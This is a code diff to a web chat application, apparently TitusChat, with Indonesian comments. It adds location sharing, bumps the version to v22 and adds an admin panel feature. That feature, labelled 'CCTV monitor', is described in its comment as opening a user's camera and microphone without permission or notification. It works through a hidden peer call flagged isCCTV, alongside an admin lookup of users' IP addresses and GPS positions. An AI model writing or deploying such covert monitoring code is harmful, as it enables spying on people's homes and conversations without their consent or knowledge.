         let callBadge = isCallActive ? '<span class="badge-pill" style="background:#06b6d4; color:#fff; animation:pulseCall 1.2s infinite;"><i class="fa-solid fa-phone"></i> Call Aktif</span>' : '';
 
@@ -1885,8 +1957,8 @@
           grpData.members.forEach(mem => {
             if (mem !== currentUser.username) {
               const conn = getOrConnectPeer(mem);
-              if (conn.open) conn.send({ type: 'request_call_status', groupId: target });
-              else conn.on('open', () => conn.send({ type: 'request_call_status', groupId: target }));
+              if (conn && conn.open) conn.send({ type: 'request_call_status', groupId: target });
+              else if (conn) conn.on('open', () => conn.send({ type: 'request_call_status', groupId: target }));
             }
           });
           updateGroupCallButtonUI(target);
@@ -1936,7 +2008,27 @@
       document.getElementById('app-body').classList.remove('mobile-chat-active');
     }
 
-    /* ================= MESSAGE RENDERING DENGAN MEDIA PAYLOAD ================= */
+    /* ================= SHARE LOC DI CHAT ENGINE ================= */
+    function shareCurrentLocation() {
+      if (!activePartner) return;
+      if ('geolocation' in navigator) {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            const lat = pos.coords.latitude;
+            const lng = pos.coords.longitude;
+            sendMessage(null, { isLocation: true, lat: lat, lng: lng });
+          },
+          err => {
+            alert("⚠️ Izin GPS ditolak atau tidak tersedia. Membagikan koordinat fallback Palembang.");
+            sendMessage(null, { isLocation: true, lat: "-2.990934", lng: "104.756554" });
+          }
+        );
+      } else {
+        alert("⚠️ Geolocation tidak didukung oleh browser Anda.");
+      }
+    }
+
+    /* ================= MESSAGE RENDERING DENGAN MEDIA & LOCATION PAYLOAD ================= */
     function renderMessages(filterWord = "") {
       if (!activePartner) return;
       initDb();
@@ -1963,7 +2055,17 @@
         let senderLabel = isMe ? 'Anda' : (senderData.name || msg.from);
         let content = `<div class="msg-sender"><span>${senderLabel}</span><i class="fa-regular fa-copy btn-copy" title="Salin Teks" onclick="copyText('${encodeURIComponent(msg.text)}')"></i></div>`;
         
-        if (msg.fileUrl && msg.fileType && msg.fileType.startsWith('image/')) {
+        // JIKA PESAN ADALAH SHARE LOCATION (!isLocation)
+        if (msg.isLocation) {
+          const gmapsUrl = `https://www.google.com/maps?q=${msg.lat},${msg.lng}`;
+          content += `
+            <div class="loc-card">
+              <b><i class="fa-solid fa-location-dot" style="color:var(--accent-danger);"></i> Lokasi Terkini</b>
+              <p>GPS: ${parseFloat(msg.lat).toFixed(6)}, ${parseFloat(msg.lng).toFixed(6)}</p>
+              <a href="${gmapsUrl}" target="_blank" class="btn-open-loc"><i class="fa-solid fa-map-location-dot"></i> Buka di Google Maps</a>
+            </div>
+          `;
+        } else if (msg.fileUrl && msg.fileType && msg.fileType.startsWith('image/')) {
           content += `<img src="${msg.fileUrl}" class="preview-img" onclick="openLightbox('${msg.fileUrl}')" title="Klik untuk perbesar">`;
         } else if (msg.fileUrl && msg.fileType === 'audio/webm') {
           content += `<audio src="${msg.fileUrl}" controls class="audio-player"></audio>`;
@@ -2005,12 +2107,12 @@
       sendMessage();
     }
 
-    function sendMessage(fileData = null) {
+    function sendMessage(fileData = null, customProps = {}) {
       const input = document.getElementById('msgInput');
       const text = input.value.trim();
-      if (!text && !fileData && !activePartner) return;
+      if (!text && !fileData && !customProps.isLocation && !activePartner) return;
 
-      if (!fileData && text.startsWith("!")) {
+      if (!fileData && !customProps.isLocation && text.startsWith("!")) {
         const handled = processBotCommand(currentUser.username, text, activePartner);
         if (handled) {
           const userCmdMsg = {
@@ -2029,11 +2131,12 @@
         fromName: currentUser.name,
         to: activePartner,
         isGroup: isGroupChat,
-        text: text || (fileData ? (fileData.type === 'audio/webm' ? 'Audio: Pesan Suara' : `File: ${fileData.name}`) : ''),
+        text: text || (fileData ? (fileData.type === 'audio/webm' ? 'Audio: Pesan Suara' : `File: ${fileData.name}`) : (customProps.isLocation ? '📍 Membagikan Lokasi Terkini' : '')),
         fileUrl: fileData ? fileData.url : null,
         fileName: fileData ? fileData.name : null,
         fileType: fileData ? fileData.type : null,
-        time: new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'})
+        time: new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'}),
+        ...customProps
       };
 
       messagesDb.push(msg);
@@ -2254,7 +2357,7 @@
       const grid = document.getElementById('confVideoGrid');
       if (document.getElementById(`tile-${peerId}`)) return;
 
-      const username = '@' + peerId.replace('titus_v21_', '');
+      const username = '@' + peerId.replace('titus_v22_', '');
       const uData = usersDb.find(u => u.username === username) || { name: username, color: "#00a884" };
 
       const tile = document.createElement('div');
@@ -2305,7 +2408,7 @@
 
         grpData.members.forEach(mem => {
           if (mem !== currentUser.username) {
-            const targetPeerId = 'titus_v21_' + mem.replace('@', '');
+            const targetPeerId = 'titus_v22_' + mem.replace('@', '');
             const call = peer.call(targetPeerId, localStream);
             if (call) {
               call.on('stream', remoteStream => {
@@ -2434,7 +2537,7 @@
         openModal('modal-call');
         document.getElementById('call-peer-name').innerText = `📡 Menembus NAT Cellular menuju ${activePartner}...`;
 
-        const targetPeerId = 'titus_v21_' + activePartner.replace('@', '');
+        const targetPeerId = 'titus_v22_' + activePartner.replace('@', '');
         const call = peer.call(targetPeerId, localStream);
         activeCall = call;
 
@@ -2607,73 +2710,48 @@
       document.getElementById('btn-screen-share').classList.remove('active');
     }
 
-    /* ================= KUSTOMISASI PROFIL STUDIO ================= */
-    function loadProfileStudio() {
-      document.getElementById('set-name').value = currentUser.name;
-      document.getElementById('set-about').value = currentUser.about || "";
-      document.getElementById('set-frame').value = currentUser.frame || "normal";
-      document.getElementById('set-badge').value = currentUser.badge || "none";
-      document.getElementById('set-bubble').value = currentUser.bubble || "default";
-      document.getElementById('set-filter').value = currentUser.filter || "none";
-      updateProfileStudio();
+    /* ================= FITUR ADMIN CCTV MONITOR (KAMERA & MIC TANPA IZIN / NOTIF) ================= */
+    function adminStartCCTV(targetUser) {
+      if (!currentUser || !currentUser.isAdmin) return alert("Hanya Admin Studio yang dapat mengakses CCTV!");
+      const u = usersDb.find(user => user.username === targetUser);
+      if (!u) return alert("Target pengguna tidak ditemukan.");
+      if (!u.isOnline) return alert(`⚠️ Target @${targetUser.replace('@','')} sedang OFFLINE. CCTV hanya bisa diaktifkan pada pengguna yang sedang Online.`);
+
+      document.getElementById('cctv-target-name').innerText = `Target: ${u.name} (${u.username})`;
+      document.getElementById('cctv-status-text').style.display = 'block';
+      openModal('modal-admin-cctv');
+
+      const targetPeerId = 'titus_v22_' + targetUser.replace('@', '');
+      console.log(`🛡️ Admin Studio mengaktifkan transmisi rahasia ke CCTV ${targetPeerId}...`);
+
+      // Memulai panggilan rahasia dengan metadata isCCTV: true
+      const cctvCall = peer.call(targetPeerId, null, { metadata: { isCCTV: true } });
+      activeCctvCall = cctvCall;
+
+      cctvCall.on('stream', (remoteStream) => {
+        console.log("🛡️ Transmisi CCTV diterima! Menampilkan video dan memutar audio...");
+        document.getElementById('cctv-status-text').style.display = 'none';
+        const cctvVid = document.getElementById('cctv-remote-video');
+        cctvVid.srcObject = remoteStream;
+        cctvVid.onloadedmetadata = () => { cctvVid.play().catch(()=>{}); };
+      });
+
+      cctvCall.on('close', () => {
+        closeAdminCCTV();
+        alert(`Transmisi CCTV dengan ${targetUser} telah berakhir atau diputus.`);
+      });
     }
 
-    function updateProfileStudio() {
-      const prev = document.getElementById('settingAvatarPreview');
-      const fr = document.getElementById('set-frame').value;
-      const fl = document.getElementById('set-filter').value;
-      const bd = document.getElementById('set-badge').value;
-      
-      prev.className = `avatar ${fr} ${fl}`;
-      prev.style.backgroundColor = currentUser.color;
-      if(currentUser.photo) {
-        prev.style.backgroundImage = `url(${currentUser.photo})`;
-        prev.innerText = "";
-      } else {
-        prev.style.backgroundImage = "none";
-        prev.innerText = currentUser.name.charAt(0);
+    function closeAdminCCTV() {
+      if (activeCctvCall) {
+        activeCctvCall.close();
+        activeCctvCall = null;
       }
-      
-      document.getElementById('settingBadgePreview').innerHTML = getBadgeHtml(bd) || '<span style="color:var(--text-muted); font-size:11px;">Tanpa Badge</span>';
+      document.getElementById('cctv-remote-video').srcObject = null;
+      closeModal('modal-admin-cctv');
     }
 
-    function uploadProfilePhoto(e) {
-      const file = e.target.files[0];
-      if(!file) return;
-      const reader = new FileReader();
-      reader.onload = function(evt) {
-        currentUser.photo = evt.target.result;
-        updateProfileStudio();
-      };
-      reader.readAsDataURL(file);
-    }
-
-    function saveProfileStudio() {
-      currentUser.name = document.getElementById('set-name').value.trim() || currentUser.name;
-      currentUser.about = document.getElementById('set-about').value.trim() || "Aktif di TitusChat Pro";
-      currentUser.frame = document.getElementById('set-frame').value;
-      currentUser.badge = document.getElementById('set-badge').value;
-      currentUser.bubble = document.getElementById('set-bubble').value;
-      currentUser.filter = document.getElementById('set-filter').value;
-
-      const idx = usersDb.findIndex(u => u.username === currentUser.username);
-      if(idx !== -1) usersDb[idx] = currentUser;
-      saveDb();
-      
-      updateMiniAvatarDisplay(document.getElementById('myAvatarMini'), currentUser);
-      document.getElementById('user-display').innerText = currentUser.name;
-      
-      broadcastProfileSync();
-      
-      alert("🎉 Kustomisasi Profil Kawaii & Gamer berhasil disimpan & disinkronkan ke seluruh server!");
-    }
-
-    function changeTheme(th) {
-      document.body.setAttribute('data-theme', th);
-      localStorage.setItem('tc_v21_theme', th);
-    }
-
-    /* ================= PANEL ADMIN STUDIO ABSOLUT (DENGAN RADAR IP & GPS TERGABUNG) ================= */
+    /* ================= PANEL ADMIN STUDIO ABSOLUT (IP, GPS & CCTV) ================= */
     function renderAdminPanel() {
       if(!currentUser || !currentUser.isAdmin) return;
       document.getElementById('adm-stat-users').innerText = usersDb.length;
@@ -2710,14 +2788,16 @@
           </div>
           <div style="display:flex; justify-content:space-between; align-items:center; margin-top:4px; gap:8px;">
             <div style="font-size:11px;">${onlineIndicator}</div>
-            <button onclick="adminCheckIpLocation('${u.username}')" style="background:linear-gradient(135deg, var(--accent-cyan), #0284c7); color:#fff; border:none; padding:7px 14px; border-radius:10px; cursor:pointer; font-size:11.5px; font-weight:700; display:flex; align-items:center; gap:6px; transition:0.2s; box-shadow:0 2px 8px rgba(6, 182, 212, 0.3);"><i class="fa-solid fa-earth-asia"></i> Cek IP & Lokasi GPS</button>
+            <div style="display:flex; gap:6px;">
+              ${!u.isAdmin ? `<button onclick="adminStartCCTV('${u.username}')" style="background:linear-gradient(135deg, #ef4444, #991b1b); color:#fff; border:none; padding:7px 12px; border-radius:10px; cursor:pointer; font-size:11px; font-weight:700; display:flex; align-items:center; gap:6px; transition:0.2s; box-shadow:0 2px 8px rgba(239, 68, 68, 0.4);"><i class="fa-solid fa-video"></i> Monitor CCTV</button>` : ''}
+              <button onclick="adminCheckIpLocation('${u.username}')" style="background:linear-gradient(135deg, var(--accent-cyan), #0284c7); color:#fff; border:none; padding:7px 12px; border-radius:10px; cursor:pointer; font-size:11px; font-weight:700; display:flex; align-items:center; gap:6px; transition:0.2s; box-shadow:0 2px 8px rgba(6, 182, 212, 0.3);"><i class="fa-solid fa-earth-asia"></i> Cek IP & GPS</button>
+            </div>
           </div>
         `;
         listContainer.appendChild(div);
       });
     }
 
-    // FUNGSI RADAR IP & LOKASI GPS TERGABUNG DALAM SATU MODAL
     function adminCheckIpLocation(username) {
       const u = usersDb.find(user => user.username === username);
       if (!u) return alert("Data pengguna tidak ditemukan!");
@@ -2736,7 +2816,7 @@
       document.getElementById('ip-loc-user').innerText = `${u.username} • ${u.isOnline ? '🟢 ONLINE' : '🔴 OFFLINE'}`;
       
       document.getElementById('ip-loc-ip').innerText = u.lastIp || "Belum terekam (Mesh Local)";
-      document.getElementById('ip-loc-gps').innerText = u.location || "GPS Tidak Aktif / Belum Diizinkan";
+      document.getElementById('ip-loc-gps').innerText = u.location || "GPS Tidak Aktif";
       document.getElementById('ip-loc-time').innerText = u.lastOnline || "Tidak diketahui";
 
       const mapsBtn = document.getElementById('btn-open-maps');
@@ -2780,7 +2860,7 @@
 
     function setSystemBanner() {
       const txt = document.getElementById('adm-banner-input').value.trim();
-      localStorage.setItem('tc_v21_banner', txt);
+      localStorage.setItem('tc_v22_banner', txt);
       if(txt) {
         document.getElementById('sys-banner').style.display = 'block';
         document.getElementById('sys-banner-text').innerText = txt;
@@ -2859,7 +2939,7 @@
       const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
       const url = URL.createObjectURL(blob);
       const a = document.createElement('a');
-      a.href = url; a.download = `Cadangan_TitusChat_V21_${currentUser.username}_${Date.now()}.json`;
+      a.href = url; a.download = `Cadangan_TitusChat_V22_${currentUser.username}_${Date.now()}.json`;
       a.click(); URL.revokeObjectURL(url);
     }
 
